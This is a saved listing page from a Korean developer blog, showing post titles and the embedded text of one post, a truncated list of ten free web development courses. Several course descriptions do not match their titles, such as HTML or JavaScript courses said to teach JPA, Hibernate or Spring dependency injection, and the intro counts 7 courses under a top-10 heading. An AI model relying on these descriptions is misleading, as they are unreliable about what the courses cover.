<!DOCTYPE html><html lang="ko"><head><meta charSet="utf-8"/><title>allround-coder</title><meta name="description" content="I develop websites, games and apps with HTML, CSS and JS."/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta property="og:url" content="https://allround-coder.github.io///posts/23" data-gatsby-head="true"/><meta property="og:type" content="website" data-gatsby-head="true"/><meta property="og:site_name" content="allround-coder" data-gatsby-head="true"/><meta property="og:title" content="allround-coder" data-gatsby-head="true"/><meta property="og:description" content="I develop websites, games and apps with HTML, CSS and JS." data-gatsby-head="true"/><meta property="og:image" content="/favicons/ms-icon-310x310.png" data-gatsby-head="true"/><meta property="og:locale" content="en_US" data-gatsby-head="true"/><meta name="twitter:card" content="summary_large_image" data-gatsby-head="true"/><meta property="twitter:domain" content="https://allround-coder.github.io/" data-gatsby-head="true"/><meta property="twitter:url" content="https://allround-coder.github.io///posts/23" data-gatsby-head="true"/><meta name="twitter:title" content="allround-coder" data-gatsby-head="true"/><meta name="twitter:description" content="I develop websites, games and apps with HTML, CSS and JS." data-gatsby-head="true"/><meta name="twitter:image" content="/favicons/ms-icon-310x310.png" data-gatsby-head="true"/><meta name="twitter:data1" content="Dev | allround-coder" data-gatsby-head="true"/><meta name="next-head-count" content="18"/><meta name="google-site-verification" content="a-yehRo3k3xv7fg6LqRaE8jlE42e5wP2bDE_2F849O4"/><link rel="stylesheet" href="/favicons/favicon.ico"/><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png"/><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="96x96" href="/assets/favicons/favicon-96x96.png"/><link rel="icon" href="/favicons/apple-icon-180x180.png"/><link rel="apple-touch-icon" href="/favicons/apple-icon-180x180.png"/><link rel="apple-touch-startup-image" href="/startup.png"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"/><meta name="msapplication-config" content="/favicons/browserconfig.xml"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-ZFDEQ947R4"></script><script>window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
  
            gtag('config', 'G-ZFDEQ947R4');</script><link rel="preload" href="/_next/static/css/6e57edcf9f2ce551.css" as="style"/><link rel="stylesheet" href="/_next/static/css/6e57edcf9f2ce551.css" data-n-g=""/><link rel="preload" href="/_next/static/css/baeec1f16d6ea8b8.css" as="style"/><link rel="stylesheet" href="/_next/static/css/baeec1f16d6ea8b8.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-ee6df16fdc6dae4d.js" defer=""></script><script src="/_next/static/chunks/framework-46611630e39cfdeb.js" defer=""></script><script src="/_next/static/chunks/main-cf4a52eec9a970a0.js" defer=""></script><script src="/_next/static/chunks/pages/_app-6fae11262ee5c69b.js" defer=""></script><script src="/_next/static/chunks/75fc9c18-4a646156c659a948.js" defer=""></script><script src="/_next/static/chunks/348-d11c34b645b13f5b.js" defer=""></script><script src="/_next/static/chunks/324-8452a6176b22a926.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bpage%5D-082571b43b6fd145.js" defer=""></script><script src="/_next/static/837W-BjvPVBgft6aM4api/_buildManifest.js" defer=""></script><script src="/_next/static/837W-BjvPVBgft6aM4api/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="posts_container__s9Z_H posts_-list__bsl0U"><header class="Header_header__Z8PUO"><div class="Header_inner__tfr0u"><strong class="Header_title__Otn70"><a href="/">Allround Coder</a></strong><nav class="Header_nav_area__6KVpk"><a class="nav_item" href="/posts/1">Posts</a></nav></div></header><div class="posts_inner__HIBjT"><article><h2 class="SectionTitle_section_title__HS_xr">Posts</h2><div class="posts_project_list__oDV_y"><div class="PostList_post_list__or0rl"><a class="PostList_post_item__gAdVi" aria-label="2024년을 위한 무료 프론트엔드 및 백엔드 개발 강좌 TOP 10" href="/post/2024-05-15-Top10FreeFrontendandBackendDevelopmentCoursesin2024"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="2024년을 위한 무료 프론트엔드 및 백엔드 개발 강좌 TOP 10" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-Top10FreeFrontendandBackendDevelopmentCoursesin2024_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="2024년을 위한 무료 프론트엔드 및 백엔드 개발 강좌 TOP 10" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">2024년을 위한 무료 프론트엔드 및 백엔드 개발 강좌 TOP 10</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">6<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="자바스크립트에서 1, 5, 11mapparseInt가 1, NaN, 3을 반환하는 이유" href="/post/2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="자바스크립트에서 1, 5, 11mapparseInt가 1, NaN, 3을 반환하는 이유" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-Why1511mapparseIntreturns1NaN3inJavascript_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="자바스크립트에서 1, 5, 11mapparseInt가 1, NaN, 3을 반환하는 이유" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">자바스크립트에서 1, 5, 11mapparseInt가 1, NaN, 3을 반환하는 이유</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">4<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="코틀린 함수가 일등 시민인 이유" href="/post/2024-05-15-KotlinFunctionsasFirstClassCitizens"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="코틀린 함수가 일등 시민인 이유" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-KotlinFunctionsasFirstClassCitizens_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="코틀린 함수가 일등 시민인 이유" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">코틀린 함수가 일등 시민인 이유</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">8<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="자바스크립트에서의 Call, Apply 및 Bind 함수들 - 깊게 들어가보기" href="/post/2024-05-15-CallApplyandBindFunctionsinJavascriptDeepDive"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="자바스크립트에서의 Call, Apply 및 Bind 함수들 - 깊게 들어가보기" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-CallApplyandBindFunctionsinJavascriptDeepDive_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="자바스크립트에서의 Call, Apply 및 Bind 함수들 - 깊게 들어가보기" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">자바스크립트에서의 Call, Apply 및 Bind 함수들 - 깊게 들어가보기</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">5<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="파이썬 초보자를 위한 안내 프로처럼 설정하기" href="/post/2024-05-15-ABeginnersGuidetoPythonGettingSetUpLikeAPro"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="파이썬 초보자를 위한 안내 프로처럼 설정하기" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-ABeginnersGuidetoPythonGettingSetUpLikeAPro_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="파이썬 초보자를 위한 안내 프로처럼 설정하기" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">파이썬 초보자를 위한 안내 프로처럼 설정하기</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">4<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="Nodejs를 사용하여 지출 추적기를 만드는 방법" href="/post/2024-05-15-AnapproachtobuildanExpenseTrackerusingNodejs"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="Nodejs를 사용하여 지출 추적기를 만드는 방법" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-AnapproachtobuildanExpenseTrackerusingNodejs_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="Nodejs를 사용하여 지출 추적기를 만드는 방법" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">Nodejs를 사용하여 지출 추적기를 만드는 방법</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">8<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="TypeScript에서 타입 복잡성을 줄이는 3가지 명쾌한 단계" href="/post/2024-05-15-HowIReduceTypeComplexityinTypeScriptwith3Clear-cutSteps"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="TypeScript에서 타입 복잡성을 줄이는 3가지 명쾌한 단계" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-HowIReduceTypeComplexityinTypeScriptwith3Clear-cutSteps_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="TypeScript에서 타입 복잡성을 줄이는 3가지 명쾌한 단계" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">TypeScript에서 타입 복잡성을 줄이는 3가지 명쾌한 단계</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">1<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="JNDI Injection - 전체 이야기" href="/post/2024-05-15-JNDIInjectionTheCompleteStory"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="JNDI Injection - 전체 이야기" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="JNDI Injection - 전체 이야기" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">JNDI Injection - 전체 이야기</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">8<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="자체제작 스파이 군사 작전에서 YOLOv8 객체 검출 활용하기" href="/post/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="자체제작 스파이 군사 작전에서 YOLOv8 객체 검출 활용하기" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="자체제작 스파이 군사 작전에서 YOLOv8 객체 검출 활용하기" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">자체제작 스파이 군사 작전에서 YOLOv8 객체 검출 활용하기</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">8<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a><a class="PostList_post_item__gAdVi" aria-label="아두이노와 iOS 간의 블루투스 연결" href="/post/2024-05-15-BluetoothconnectionbetweenArduinoandiOS"><div class="PostList_thumbnail_wrap__YuxdB"><img alt="아두이노와 iOS 간의 블루투스 연결" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" class="PostList_thumbnail__6_oQk" style="color:transparent" src="/assets/img/2024-05-15-BluetoothconnectionbetweenArduinoandiOS_0.png"/></div><div class="PostList_text_area__Hzd11"><div class="PostList_profile_area___aTjn"><div class="PostList_profile_image_wrap__tCTuE"><img alt="아두이노와 iOS 간의 블루투스 연결" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="PostList_profile__VGF_a" style="color:transparent" src="/assets/profile.jpg"/></div><span class="writer">Allround Coder</span></div><strong class="PostList_title__loLkl">아두이노와 iOS 간의 블루투스 연결</strong><div class="PostList_meta__VCFLX"><span class="date">May 15, 2024</span><span class="PostList_reading_time__6CBMQ">14<!-- --> min read</span><span class="PostList_bookmark__PCpOK"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" aria-hidden="true"><path d="M6.75 4.5h10.5a.75.75 0 01.75.75v14.357a.375.375 0 01-.575.318L12 16.523l-5.426 3.401A.375.375 0 016 19.607V5.25a.75.75 0 01.75-.75zM16.5 6h-9v11.574l4.5-2.82 4.5 2.82V6z"></path></svg></span></div></div></a></div></div></article><div class="posts_pagination__R_03T"><button type="button" class="page_button -prev">&lt;</button><a class="link" href="/posts/21">21</a><a class="link" href="/posts/22">22</a><a class="link" href="/posts/23">23</a><a class="link" href="/posts/24">24</a><a class="link" href="/posts/25">25</a><a class="link" href="/posts/26">26</a><a class="link" href="/posts/27">27</a><a class="link" href="/posts/28">28</a><a class="link" href="/posts/29">29</a><a class="link" href="/posts/30">30</a><a class="link" href="/posts/31">31</a><a class="link" href="/posts/32">32</a><a class="link" href="/posts/33">33</a><a class="link" href="/posts/34">34</a><a class="link" href="/posts/35">35</a><a class="link" href="/posts/36">36</a><a class="link" href="/posts/37">37</a><a class="link" href="/posts/38">38</a><a class="link" href="/posts/39">39</a><a class="link" href="/posts/40">40</a><button type="button" class="page_button -prev">&gt;</button></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"posts":[{"title":"2024년을 위한 무료 프론트엔드 및 백엔드 개발 강좌 TOP 10","description":"","date":"2024-05-15 10:30","slug":"2024-05-15-Top10FreeFrontendandBackendDevelopmentCoursesin2024","content":"\n\n## 초보자와 중급 개발자를 위한 내가 좋아하는 무료 웹 개발 강좌\n\n![image](/assets/img/2024-05-15-Top10FreeFrontendandBackendDevelopmentCoursesin2024_0.png)\n\n안녕하세요 여러분, 여러분이 2024년에 프론트엔드와 백엔드 개발을 배우고 무료 온라인 강좌, 튜토리얼, 그리고 책과 같은 최고의 무료 자료를 찾고 있다면 제가 맞는 장소에 오신 것을 환영합니다.\n\n이전에는 HTML, CSS, JavaScript, React, Angular, 그리고 Node.js를 배우기 위한 최고의 웹 개발 온라인 강좌를 공유한 적이 있으며, 이번 기사에서는 웹 개발을 배우기 위한 최고의 무료 온라인 강좌를 공유하려고 합니다.\n\n\n\n이 기사에는 Udemy 및 Coursera와 같은 사이트에서 무료로 가입할 수있는 무료 웹 개발 과정이 포함되어 있습니다. 이를 통해 누구나 2024년에 웹 개발에 필요한 기본 기술을 배울 수 있습니다.\n\n하지만, 먼저 프론트엔드와 백엔드를 모두 다루는 웹 개발에 대해 알려주는 최고의 무료 온라인 과정 10개로 넘어가기 전에요.\n\n웹 개발이란 인터넷에 호스팅되는 웹사이트를 개발하는 데 관련된 모든 작업을 정의하는 데 사용됩니다. 웹사이트를 개발하는 과정에는 웹 디자인, 웹 콘텐츠 개발, 서버 측 스크립팅 및 네트워크 보안 구성이 포함될 수 있습니다.\n\n웹 개발은 또한 웹사이트를 생성, 유지 관리 및 관리하기 위해 필요한 모든 다양한 작업, 작업 및 업데이트를 의미할 수도 있습니다. 좋은 웹 개발자는 최적의 성능, 속도 및 사용자 경험을 확보해야 합니다.\n\n\n\n# 2024년 초보자를 위한 최고의 무료 웹 개발 강좌 10선\n\n여기서는 7개의 최고의 무료 웹 개발 강좌 목록을 모았습니다. 계속 읽어보세요.\n\n## 1. 웹 개발자를 위한 웹 디자인: 아름다운 웹사이트 만들기\n\n이 강좌는 몇 가지 빠른 단계로 흥미로운 멋진 웹사이트를 만드는 방법을 가르치는 좋은 무료 강좌입니다. HTML과 주석 기반 의존성 주입을 효율적으로 사용할 수 있게 될 것입니다.\n\n\n\n이제 여러 웹 사이트에 대한 외부 맞춤 속성 및 빈을 구성할 수 있을 것입니다. 다양한 기능을 활용하여 올바른 방법으로 흥미로운 이메일을 보내는 방법을 배우게 될 것입니다.\n\n수업 기간: 2 시간\n\n수업 평점: 5점 중 4.4점\n\n강사: Jonas Schmeldtmann\n\n\n\n코스 비용: 무료\n\n![이미지](/assets/img/2024-05-15-Top10FreeFrontendandBackendDevelopmentCoursesin2024_1.png)\n\n## 2. JavaScript Essentials [Udemy]\n\n이 멋진 코스에서는 JavaScript를 사용하여 아름다운 웹사이트를 구성하고 만드는 방법을 배울 수 있습니다. 또한 JavaScript를 사용하여 웹 애플리케이션을 만들 수도 있습니다. 또한 JPA와 Hibernate를 사용하여 데이터베이스에서 데이터를 저장 및 업데이트하는 방법도 배울 수 있습니다.\n\n\n\n강의 기간: 6 시간\n\n강의 평가: 5점 만점에 4.1점\n\n강사: Lawrence Turton\n\n수강료: 무료\n\n\n\n![Course Image](/assets/img/2024-05-15-Top10FreeFrontendandBackendDevelopmentCoursesin2024_2.png)\n\n## 3. Practical PHP: Master The Basics And Code Dynamic Websites\n\n이 흥미로운 강의를 통해 PHP와 JavaScript를 사용하여 놀라운 웹 사이트를 만들 수 있습니다. HTTP 요청을 처리하는 웹 서비스 엔드포인트를 만드는 방법을 배울 것입니다. 또한 URL 쿼리 문자열 요청 매개변수를 읽고 삭제할 수도 있을 것입니다.\n\n강의 기간: 3 시간\n\n\n\n코스 평점: 5점 만점에 4.4점\n\n코스 강사: 브래드 허시와 코드 컬리지\n\n코스 가격: 무료\n\n![이미지](/assets/img/2024-05-15-Top10FreeFrontendandBackendDevelopmentCoursesin2024_3.png)\n\n\n\n## 4. 웹 개발 체험하기: 처음부터 배우는 HTML과 CSS\n\n이 강좌는 웹 개발을 다뤄봄으로서 개발부터 배포까지 완벽한 안내서 역할을 해 줄 것입니다. HTML과 CSS를 이용해 다양한 기술로 애플리케이션을 구축하는 방법을 배울 수 있을 것입니다.\n\n수강 시간: 3 시간\n\n수강 평점: 5점 만점 중 4점\n\n\n\n강좌 강사: Bradley Berger\n\n강좌 가격: 무료\n\n![이미지](/assets/img/2024-05-15-Top10FreeFrontendandBackendDevelopmentCoursesin2024_4.png)\n\n## 5. HTML5 및 CSS 3로 일주일 안에 첫 번째 웹사이트 만들기\n\n\n\n이 멋진 강좌를 통해 1주일만에 아름답고 기능적인 웹사이트를 만드는 방법을 배울 수 있습니다. 또한 포트폴리오에 표시할 새로운 프로젝트를 만들 수도 있습니다.\n\nSpring Data JPA를 활용하여 데이터를 저장하고 받는 방법을 배우게 될 것이며, Thymeleaf를 사용하여 데이터베이스에서 웹페이지로 데이터를 표시할 수도 있습니다.\n\n강좌 소요 시간: 3시간\n\n강좌 평가: 5점 만점 중 4.2점\n\n\n\n강좌 강사: Ryan Bernhardt\n\n강좌 가격: 무료\n\n![이미지](/assets/img/2024-05-15-Top10FreeFrontendandBackendDevelopmentCoursesin2024_5.png)\n\n## 6. 프론트엔드 웹 개발 기초 [Udemy]\n\n\n\n이것은 웹 디자인과 웹 개발에 대해 알아야 할 모든 것을 가르쳐주는 훌륭한 무료 강좌입니다. 웹 사이트와 그 뒤에있는 데이터베이스 간의 통신 라인을 어떻게 구축할 수 있는지 배우게 될 것입니다.\n\n먼저 웹 사이트를 위한 간단한 첫 페이지를 만드는 방법을 배우게 됩니다. 게다가 웹 사이트에 도움이 될 기능적인 데이터베이스도 만들 수 있을 겁니다.\n\n강좌 기간: 1 시간\n\n강좌 평점: 5점 중 4.5점\n\n\n\n강의 강사: Davide Molin\n\n강의 가격: 무료\n\n![Course Image](/assets/img/2024-05-15-Top10FreeFrontendandBackendDevelopmentCoursesin2024_6.png)\n\n## 7. 스프링 부트와 스프링 클라우드로 스프링 마이크로서비스 마스터하기\n\n\n\n이 코스는 Spring Cloud를 사용하여 Spring Boot Microservices를 마스터하는 데 도움이 되는 훌륭한 코스입니다. 이 코스를 통해 Java로 마이크로서비스를 만들기 위해 필요한 Spring 및 Spring Boot에 대해 모든 것을 배울 수 있습니다.\n\n코스 기간: 2 시간\n\n코스 평가: 5점 만점 중 4.4점\n\n코스 강사: Karthikeya T\n\n\n\n수업 가격: 무료\n\n![image](/assets/img/2024-05-15-Top10FreeFrontendandBackendDevelopmentCoursesin2024_7.png)\n\n## 8. DevTools Pro: Chrome 개발자 도구 기초 [Udemy]\n\n이 강의에서는 이력서를 향상시키고 포트폴리오를 자랑하기 위해 아름다운 창조적인 웹사이트를 만드는 방법을 가르쳐줍니다. 구글 크롬 애플리케이션을 위한 간단한 웹사이트를 만드는 방법을 배울 수 있습니다. 또한 리소스를 저장하기 위해 계층적인 크롬 웹사이트를 만드는 방법도 배울 수 있습니다.\n\n\n\n강의 기간: 1시간\n\n강의 평점: 5점 만점 중 4.6점\n\n강의 강사: Rocco Balsamo\n\n강의 가격: 무료\n\n\n\n![이미지](/assets/img/2024-05-15-Top10FreeFrontendandBackendDevelopmentCoursesin2024_8.png)\n\n## 9. 초보자를 위한 스프링 프레임워크와 의존성 주입\n\n이것은 몇 가지빠른 단계로 흥미로운 스프링 애플리케이션을 만드는 방법을 가르쳐주는 좋은 무료 강좌입니다. Java와 주석 기반의 의존성 주입을 효과적으로 사용할 수 있게 될 것입니다.\n\n다양한 환경에 대한 외부 사용자 정의 속성 및 빈을 구성할 수 있을 것입니다. 또한 Spring Boot를 사용하여 SMTP 메일을 올바른 방식으로 보내는 방법을 배우게 될 것입니다.\n\n\n\n코스 기간: 2시간\n\n코스 평점: 5점 만점에 4.4점\n\n강사: 산제이 파텔\n\n코스 가격: 무료\n\n\n\n\u003cimg src=\"/assets/img/2024-05-15-Top10FreeFrontendandBackendDevelopmentCoursesin2024_9.png\" /\u003e\n\n## 10. 초보자를 위한 Node JS API 개발 [무료]\n\n온라인에서 얻을 수 있는 최고의 Node JS 초보자 과정 중 하나입니다. 이 과정에서는 Node JS API 개발을 처음부터 배우게 됩니다.\n\n이 과정은 완전한 초보자들에게 게시된 가이드와 같습니다. Node JS가 무엇이며 왜 node.js를 배워야 하는지부터 시작해서, node js 개발 환경 설치 방법 및 브라우저 및 비브라우저 배경에서 JavaScript가 어떻게 실행되는지 이해할 수 있습니다.\n\n이 과정에서는 Modern JavaScript, Node JS 이벤트 루프, 비동기 프로그래밍, 노드 모듈, npm 모듈 및 직접 모듈 만들기, 서버 만들기, 데이터베이스에 연결하고 json 응답을 보내는 방법을 배울 수 있습니다.\n\n이 과정은 이론과 실습의 아주 좋은 조화를 갖추고 있어 무료 강좌로는 매우 어려운 것입니다.\n\n\n\n이 무료 강의에 참여할 수 있는 링크입니다 - Node JS API 개발\n\n![Node JS API Development](/assets/img/2024-05-15-Top10FreeFrontendandBackendDevelopmentCoursesin2024_10.png)\n\n2024년에 참여할 수 있는 최고의 10개 무료 웹 개발 강좌에 대해 알아보았습니다. JavaScript, PHP 및 Java 개발자를 위한 무료 웹 개발 강좌를 모두 포함했습니다. 프론트엔드 개발과 백엔드 개발 강좌 모두를 조화롭게 섞어 웹 개발을 깊이 있게 학습하고 풀스택 개발자로 거듭날 수 있도록 노력했습니다.\n\n이 10개의 최고의 무료 웹 개발 강좌 목록이 마음에 드신다면 친구나 가족과 자유롭게 공유해보세요.\n\n\n\n웹 개발 분야에 의문이 생기면 언제든지 댓글을 달아주세요. 저희가 즉시 답변해 드릴 거에요. 이 강좌들은 몇 주 만에 완전 초보자에서 숙련된 웹 개발자로 변신할 수 있을 거라고 확신해요.\n\n다른 웹 개발자를 위한 리소스:\n\n- 웹 개발을 배우기 위한 최고 5개 강좌\n- React 프레임워크를 학습하기 위한 최고 5개 강좌\n- 2024년 웹 개발자로 거듭나는 방법\n- 초보자를 위한 Node.js 학습을 위한 최상의 10개 강좌\n- 풀 스택 개발자가 되기 위한 최상의 10개 강좌\n- 초보자를 위한 Angular 학습을 위한 10개의 무료 강좌\n- 2024년 React 